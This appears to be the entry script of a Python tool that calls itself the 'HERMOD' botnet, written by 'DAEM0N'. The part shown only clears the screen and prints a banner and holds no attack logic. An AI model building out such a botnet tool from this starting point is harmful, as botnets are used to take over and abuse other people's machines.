import socket
import os
import time
import pyfiglet

import util
from src.colors import BColors
from src.dependencies import *

command = lambda x: os.system(x)
command('clear')

if __name__ == '__main__':
    util.print_banner('HERMOD')
    print(BColors.RED + '\n                              BOTNET')
    print(BColors.WHITE + '\n                        Written by ' + BColors.RED + 'DAEM0N\n')
    util.print_spacer()
